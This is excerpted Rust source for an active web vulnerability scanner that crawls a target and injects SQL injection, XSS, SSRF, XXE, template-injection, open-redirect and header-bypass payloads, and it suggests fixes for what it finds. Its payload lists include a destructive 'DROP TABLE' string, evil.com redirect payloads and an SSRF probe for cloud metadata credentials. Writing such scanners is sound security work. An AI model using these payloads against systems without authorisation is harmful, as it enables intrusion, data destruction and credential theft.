...
const SQLI_ERROR_PAYLOADS: &[&str] = &[
    ...
    "'; DROP TABLE test--", "1; WAITFOR DELAY '0:0:0'--",
    "' AND 1=CONVERT(int,'a')--", "1' AND '1'='1' /*",
...
const SQLI_ERROR_SIGNATURES: &[&str] = &[
    ...
    "microsoft ole db provider", "microsoft sql",
    "syntax error", "[sqlite_error]",
    "sql syntax", "mysql_fetch", "mysql_num_rows",
    "odbc sql server driver", "sql command not properly ended",
    "invalid column name", "column count doesn't match",
    "supplied argument is not a valid mysql",
    "unterminated quoted string", "sqlstate",
    "jdbc.sqle", "hibernate", "javax.persistence",
    "org.hibernate", "sql server", "sqlite3",
];
...
const OPEN_REDIRECT_PAYLOADS: &[&str] = &[
    ...
    "https://legitimate.com@evil.com", "/\\evil.com",
    "https://evil.com%00.legitimate.com", "javascript:alert(1)",
];
...
const INFO_DISCLOSURE_SIGS: &[(&str, &str, &str)] = &[
    ...
    ("internal_path", "(?i)(/home/[a-z]+/|/var/www/|/opt/|C:\\\\Users\\\\|C:\\\\inetpub)", "Internal file path exposed"),
    ("sql_query", "(?i)(SELECT .+ FROM|INSERT INTO|UPDATE .+ SET|DELETE FROM)", "SQL query exposed in response"),
    ("env_var", "(?i)(DATABASE_URL|SECRET_KEY|API_KEY|AWS_ACCESS|PRIVATE_KEY)\\s*[:=]", "Environment variable leak"),
    ("version_header", "(?i)(PHP/|ASP\\.NET|Express/|Django/|Rails/|Flask/|Spring/)", "Framework version disclosed"),
];
...
pub async fn run_active_scan(target: &str, config: &ScanConfig) -> Result<ScanResult, String> {
    ...
    all_request_logs.push(RequestLog {
        ...
        request_body: None, response_status: baseline_status,
    ...
    // Technology detection on baseline
    ...
    // ═══════════════════════════════════════════════════════════════════
    //  PHASE 2: Auto-Crawl to discover endpoints + injection points
    // ═══════════════════════════════════════════════════════════════════
    if config.auto_crawl {
        ...
        for cap in link_re.captures_iter(&baseline_body) {
            if let Some(m) = cap.get(1) {
                let link = m.as_str();
                if link.starts_with("javascript:") || link.starts_with("mailto:") || link.starts_with("#") { continue; }
        ...
        // Crawl discovered links (breadth-first, depth limited)
        for url in link_queue.into_iter().take(30) {
            if total_requests >= config.max_requests / 3 { break; }
            let req_start = std::time::Instant::now();
            if let Ok(resp) = client.get(&url).send().await {
                ...
                // Extract more links from crawled pages
                if ct.contains("html") {
                    for cap in link_re.captures_iter(&body) {
                        if let Some(m) = cap.get(1) {
                            let link = m.as_str();
                            if link.starts_with("javascript:") || link.starts_with("mailto:") { continue; }
    ...
    // ═══════════════════════════════════════════════════════════════════
    //  PHASE 3: Discover Injection Points from all crawled URLs
    // ═══════════════════════════════════════════════════════════════════
        ...
        if let Ok(parsed) = url::Url::parse(url) {
            for (k, v) in parsed.query_pairs() {
                let point = InjectionPoint {
                    url: url.clone(), param_name: k.to_string(),
                    param_type: "query".into(), original_value: v.to_string(),
                };
    ...
    // Also extract form params from all pages
    let form_re = regex::Regex::new(r#"<form[^>]*action\s*=\s*["']([^"']*)["'][^>]*>([\s\S]*?)</form>"#).unwrap();
    let input_re = regex::Regex::new(r#"<input[^>]*name\s*=\s*["']([^"']+)["'][^>]*>"#).unwrap();
    let method_re = regex::Regex::new(r#"method\s*=\s*["'](\w+)["']"#).unwrap();

    // Scan the baseline for forms
    for form_cap in form_re.captures_iter(&baseline_body) {
        ...
        for input_cap in input_re.captures_iter(form_inner) {
            if let Some(name) = input_cap.get(1) {
                let point = InjectionPoint {
                    url: form_url.clone(), param_name: name.as_str().to_string(),
                    param_type: "form".into(), original_value: "".into(),
                };
    ...
    // If no params found at all, add the target as a path-based injection point
    if all_params.is_empty() {
        // Try common parameter names as test injection points
        let common_params = ["id", "page", "q", "search", "query", "name", "user", "file", "url", "redirect", "path", "action", "type", "cat", "category", "item", "view", "lang"];
        for param in &common_params {
            ...
            injection_points.push(InjectionPoint {
                url: target.to_string(), param_name: param.to_string(),
                param_type: "discovered".into(), original_value: "".into(),
            });
        }
    }

    // ═══════════════════════════════════════════════════════════════════
    //  PHASE 4: Passive Security Audit
    // ═══════════════════════════════════════════════════════════════════
    ...
    if config.check_cors {
        let req_start = std::time::Instant::now();
        if let Ok(cors_resp) = client.get(target)
            ...
            let cors_headers: HashMap<String, String> = cors_resp.headers().iter()
                .map(|(k, v)| (k.to_string().to_lowercase(), v.to_str().unwrap_or("").to_string()))
                .collect();
            let hdrs: Vec<String> = cors_resp.headers().iter()
                .map(|(k, v)| format!("{}: {}", k, v.to_str().unwrap_or(""))).collect();
            ...
            if let Some(acao) = cors_headers.get("access-control-allow-origin") {
                if acao == "*" || acao.contains("evil.com") {
                    let acac = cors_headers.get("access-control-allow-credentials").map(|v| v.as_str()).unwrap_or("false");
    ...
    if config.check_sqli {
        for (param_url, param_name, param_value) in &all_params {
            if total_requests >= config.max_requests { break; }
            ...
            for payload in SQLI_ERROR_PAYLOADS {
                ...
                if let Ok(resp) = client.get(&test_url).send().await {
                    ...
                    let req_log = RequestLog {
                        method: "GET".into(), url: test_url.clone(),
                        request_headers: vec![format!("Payload: {}", payload)],
                        request_body: None, response_status: status,
                        response_headers: hdrs, response_body_preview: body.chars().take(500).collect(),
            ...
            if total_requests + 2 < config.max_requests {
                ...
                if let (Ok(true_resp), Ok(false_resp)) = (
                    client.get(&true_url).send().await,
                    client.get(&false_url).send().await,
                ) {
                    total_requests += 2;
                    ...
                    if (baseline_diff < 50 && false_diff > 200) || (tf_diff > 200 && true_status != false_status) {
                        findings.push(ScanFinding {
                            id: uuid::Uuid::new_v4().to_string(),
                            finding_type: "sqli".into(),
        ...
        for (param_url, param_name, _) in &all_params {
            ...
            if let Ok(resp) = client.get(&canary_url).send().await {
                ...
                if body.contains(&canary) {
                    // Input is reflected — determine context
                    let in_tag = body.contains(&format!("<{}", canary)) || body.contains(&format!("\"{}\"", canary));
                    let in_attr = body.contains(&format!("=\"{}\"", canary)) || body.contains(&format!("='{}'", canary));
                    let in_script = body.contains(&format!("var {}=", canary)) || body.contains(&format!("'{}'", canary));
                    ...
                    for (payload, marker) in XSS_PAYLOADS {
                        ...
                        if let Ok(xss_resp) = client.get(&xss_url).send().await {
                            ...
                            let ct = xss_resp.headers().get("content-type").and_then(|v| v.to_str().ok()).unwrap_or("").to_string();
                            let hdrs: Vec<String> = xss_resp.headers().iter()
                                .map(|(k, v)| format!("{}: {}", k, v.to_str().unwrap_or(""))).collect();
                            let xss_body = xss_resp.text().await.unwrap_or_default();
                            let elapsed = req_start.elapsed().as_millis() as u64;

                            if xss_body.contains(payload) || xss_body.contains(marker) {
                                let context = if in_script { "JavaScript" } else if in_attr { "HTML attribute" } else if in_tag { "HTML tag" } else { "HTML body" };
                                findings.push(ScanFinding {
                                    id: uuid::Uuid::new_v4().to_string(),
    ...
    if config.check_ssrf {
        for (param_url, param_name, _) in &all_params {
            ...
            let ssrf_payloads = [
                ...
                "http://[::1]", "http://0x7f000001", "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            ];
            for payload in &ssrf_payloads {
                ...
                if let Ok(resp) = client.get(&ssrf_url).send().await {
                    ...
                    let body = resp.text().await.unwrap_or_default();
                    if body.contains("ami-id") || body.contains("instance-id") || body.contains("local-ipv4")
    ...
    if config.check_xxe {
        for (payload, content_type, signature) in XXE_PAYLOADS {
            if total_requests >= config.max_requests { break; }
            if let Ok(resp) = client.post(target)
    ...
    if config.check_open_redirect {
        let redirect_params = ["redirect", "url", "next", "return", "returnTo", "return_url", "redirect_uri", "callback", "goto", "dest"];
        for param_name in &redirect_params {
            ...
            for payload in OPEN_REDIRECT_PAYLOADS {
                ...
                if let Ok(resp) = reqwest::Client::builder()
                    ...
                    .get(&redirect_url).send().await
                {
                    total_requests += 1;
                    let status = resp.status().as_u16();
                    let location = resp.headers().get("location")
                        .and_then(|v| v.to_str().ok()).unwrap_or("");
                    if status >= 300 && status < 400 && (location.contains("evil.com") || location.contains(payload)) {
                        findings.push(ScanFinding {
                            id: uuid::Uuid::new_v4().to_string(),
    ...
    // ═══════════════════════════════════════════════════════════════════
    //  PHASE 5b: JSON Body Parameter Injection
    // ═══════════════════════════════════════════════════════════════════
    // Check if baseline response is JSON → try POST injection on JSON bodies
    if baseline_headers.get("content-type").map(|v| v.contains("json")).unwrap_or(false)
        || baseline_body.trim_start().starts_with('{')
    {
        // Try POST with JSON body injection
        let json_injection_payloads: Vec<(&str, &str, &str, &str)> = vec![
            // (payload, finding_type, finding_name, severity)
        ...
        // Try to parse the baseline body as JSON and inject into each field
        if let Ok(json_val) = serde_json::from_str::<serde_json::Value>(&baseline_body) {
            if let Some(obj) = json_val.as_object() {
                for (json_key, json_value) in obj {
                    if !json_value.is_string() && !json_value.is_number() { continue; }
                    if total_requests >= config.max_requests { break; }
                    ...
                    for (payload, ftype, fname, sev) in &json_injection_payloads {
                            ...
                            .send().await
                        {
                            ...
                            let mut found = false;
                            // Check for SQLi error signatures
                            if *ftype == "sqli" {
                                for sig in SQLI_ERROR_SIGNATURES {
                                    if body_lower.contains(sig) {
                                        found = true;
                            ...
                            if *ftype == "xss" && !found && body.contains(payload) {
                                ...
                                findings.push(ScanFinding {
                                    ...
                                    parameter: Some(format!("JSON body → $.{}", json_key)),
                                    payload: Some(payload.to_string()),
                                    evidence: Some(format!("Payload reflected unencoded | Status: {} | Time: {}ms", status, elapsed)),
                                    detail: format!("JSON body field '{}' reflects XSS payload without encoding.", json_key),
                            ...
                            // SSTI check
                            if *ftype == "ssti" && !found && body.contains("49") && !baseline_body.contains("49") {
                                findings.push(ScanFinding {
                                    id: uuid::Uuid::new_v4().to_string(),
                                    finding_type: ftype.to_string(),
                                    name: fname.to_string(),
                            ...
                            if (*ftype == "path_traversal" && body.contains("root:") && !baseline_body.contains("root:"))
                                || (*ftype == "command_injection" && body.contains("uid=") && !baseline_body.contains("uid="))
                            {
                                findings.push(ScanFinding {
                                    id: uuid::Uuid::new_v4().to_string(),
                                    finding_type: ftype.to_string(),
                                    ...
                                    parameter: Some(format!("JSON body → $.{}", json_key)),
                                    payload: Some(payload.to_string()),
                                    evidence: Some(format!("OS output detected in response | Status: {}", status)),
                                    detail: format!("JSON field '{}' is vulnerable. Payload: {}", json_key, payload),
                                    remediation: "Validate and sanitize all JSON body input.".into(),
                                    request_info: None,
                                });
                            }

                            if found { break; } // Move to next field
                        }
                    }
                }
            }
    ...
    // ═══════════════════════════════════════════════════════════════════
    //  PHASE 5c: HTTP Header Injection (User-Agent, Referer, X-Forwarded-For)
    // ═══════════════════════════════════════════════════════════════════
    let injectable_headers: Vec<(&str, Vec<(&str, &str, &str)>)> = vec![
        ...
        ("X-Forwarded-Host", vec![
            ("evil.com", "ssrf", "Host Header Injection via X-Forwarded-Host"),
        ]),
        ("X-Original-URL", vec![
            ("/admin", "path_traversal", "Auth Bypass via X-Original-URL"),
        ]),
        ("X-Rewrite-URL", vec![
            ("/admin", "path_traversal", "Auth Bypass via X-Rewrite-URL"),
        ]),
    ];
    ...
    for (header_name, payloads) in &injectable_headers {
        ...
        for (payload, ftype, fname) in payloads {
            if total_requests >= config.max_requests { break; }
            let req_start = std::time::Instant::now();
            if let Ok(resp) = client.get(target)
                ...
                .send().await
            {
                ...
                if *ftype == "xss" && !detected && body.contains(payload) {
                    findings.push(ScanFinding {
                        ...
                        finding_type: ftype.to_string(),
                        name: fname.to_string(),
                        severity: "medium".into(), confidence: "firm".into(),
                        url: target.into(),
                        parameter: Some(format!("Header: {}", header_name)),
                        payload: Some(payload.to_string()),
                        evidence: Some(format!("Payload reflected from {} header | Status: {}", header_name, status)),
                        detail: format!("The '{}' header value is reflected in the response without encoding.", header_name),
                ...
                if *ftype == "ssti" && !detected && body.contains("49") && !baseline_body.contains("49") {
                    findings.push(ScanFinding {
                        ...
                        detail: format!("The '{}' header value is processed by a template engine.", header_name),
                        remediation: "Never pass header values into template engines.".into(),
                        request_info: None,
                    });
                }
                // X-Original-URL / X-Rewrite-URL auth bypass check
                if (*header_name == "X-Original-URL" || *header_name == "X-Rewrite-URL")
                    && status == 200 && body.len() != baseline_len
                    && (body_lower.contains("admin") || body_lower.contains("dashboard") || body_lower.contains("manage"))
                {
                    findings.push(ScanFinding {
                        id: uuid::Uuid::new_v4().to_string(),
                        finding_type: "path_traversal".into(),
    ...
    // ═══════════════════════════════════════════════════════════════════
    //  PHASE 5d: Cookie-Based Injection Testing
    // ═══════════════════════════════════════════════════════════════════
    // Extract cookies from baseline and inject payloads
                        ...
                        .send().await
                    {
                        ...
                        if *ftype == "xss" && body.contains(payload) {
                            findings.push(ScanFinding {
                                ...
                                parameter: Some(format!("Cookie: {}", cookie_name)),
                                payload: Some(payload.to_string()),
                                evidence: Some(format!("Cookie value reflected unencoded | Status: {}", status)),
                                detail: format!("Cookie '{}' value is reflected in the response without encoding.", cookie_name),
    ...
    // ═══════════════════════════════════════════════════════════════════
    //  PHASE 5e: XML Body Injection Testing
    // ═══════════════════════════════════════════════════════════════════
    // If the baseline body looks like XML, try XXE and injection via XML elements
        ...
        || baseline_headers.get("content-type").map(|v| v.contains("xml")).unwrap_or(false)
    {
        let xml_injection_payloads: Vec<(&str, &str, &str, &str, &str)> = vec![
            // (wrapped_payload, content_type, signature, finding_type, name)
                ...
                .send().await
            {
                ...
                if body.contains(signature) {
                    findings.push(ScanFinding {
                        ...
                        payload: Some(payload.to_string()),
                        evidence: Some(format!("Signature '{}' in response | Status: {} | Time: {}ms", signature, status, elapsed)),
                        detail: format!("XML parser processes external entities.\n\nPayload:\n{}\n\nFile content: '{}'", payload, signature),
                        remediation: "Disable DTD processing and external entity resolution in XML parser.".into(),
                        request_info: Some(RequestLog {
                            method: "POST".into(), url: target.into(),
    ...
    // ═══════════════════════════════════════════════════════════════════
    //  PHASE 6: Additional error-triggering probes
    // ═══════════════════════════════════════════════════════════════════

    // Try common error-triggering paths
    let error_paths = [
        "/.env", "/.git/HEAD", "/wp-config.php.bak", "/server-status",
    ...
    for path in &error_paths {
        ...
        if let Ok(resp) = client.get(&test_url).send().await {
            ...
            if status == 200 || status == 301 || status == 302 {
                ...
                if *path == "/.env" && (body.contains("DB_") || body.contains("SECRET") || body.contains("API_KEY") || body.contains("PASSWORD")) {
                    findings.push(ScanFinding {
                        id: uuid::Uuid::new_v4().to_string(),
                    ...
                    findings.push(ScanFinding {
                        ...
                        severity: "high".into(), confidence: "certain".into(),
                        url: test_url.clone(), parameter: None, payload: None,
                        evidence: Some(format!("Git HEAD: {}", body.trim())),
                        detail: format!("The .git directory is publicly accessible. Source code can be fully downloaded."),
                    ...
                    findings.push(ScanFinding {
                        ...
                        severity: "low".into(), confidence: "certain".into(),
                        url: test_url.clone(), parameter: None, payload: None,
                        evidence: Some(format!("Status: {} | Content-Type: {} | Size: {}", status, ct, body.len())),
...
// ── Passive audit helpers ───────────────────────────────────────────

fn passive_header_scan(url: &str, headers: &HashMap<String, String>, body: &str, findings: &mut Vec<ScanFinding>) {
    let checks: Vec<(&str, &str, &str, &str)> = vec![
        ("x-frame-options", "Missing X-Frame-Options Header", "medium", "Add 'X-Frame-Options: DENY' or 'SAMEORIGIN' to prevent clickjacking attacks."),
        ("content-security-policy", "Missing Content-Security-Policy Header", "medium", "Implement a strict CSP. Example: default-src 'self'; script-src 'self'"),
        ("strict-transport-security", "Missing Strict-Transport-Security (HSTS)", "low", "Add 'Strict-Transport-Security: max-age=31536000; includeSubDomains; preload'"),
        ("x-content-type-options", "Missing X-Content-Type-Options Header", "low", "Add 'X-Content-Type-Options: nosniff' to prevent MIME-type sniffing."),
        ("permissions-policy", "Missing Permissions-Policy Header", "info", "Add Permissions-Policy to restrict browser features (camera, microphone, geolocation)."),
        ("referrer-policy", "Missing Referrer-Policy Header", "info", "Add 'Referrer-Policy: strict-origin-when-cross-origin' to control referrer leakage."),
        ("cross-origin-opener-policy", "Missing Cross-Origin-Opener-Policy", "info", "Add COOP header for cross-origin isolation."),
    ];
...
fn passive_cookie_scan(url: &str, headers: &HashMap<String, String>, findings: &mut Vec<ScanFinding>) {
    ...
    for (key, value) in headers {
        ...
        if !lower.contains("httponly") { issues.push("missing HttpOnly flag (JavaScript can access cookie)"); }
        if !lower.contains("secure") && url.starts_with("https") { issues.push("missing Secure flag (cookie sent over HTTP)"); }
        if !lower.contains("samesite") { issues.push("missing SameSite attribute (vulnerable to CSRF)"); }
        if lower.contains("samesite=none") && !lower.contains("secure") { issues.push("SameSite=None without Secure (browsers will reject)"); }
        if !issues.is_empty() {
            findings.push(ScanFinding {
                id: uuid::Uuid::new_v4().to_string(),
...
fn info_disclosure_scan(url: &str, body: &str, headers: &HashMap<String, String>, findings: &mut Vec<ScanFinding>) {
...
fn inject_param(url: &str, param: &str, value: &str) -> String {
    if let Ok(mut parsed) = url::Url::parse(url) {
        let mut found = false;
        let new_pairs: Vec<(String, String)> = parsed.query_pairs()
            .map(|(k, v)| {
                if k == param { found = true; (k.to_string(), value.to_string()) }
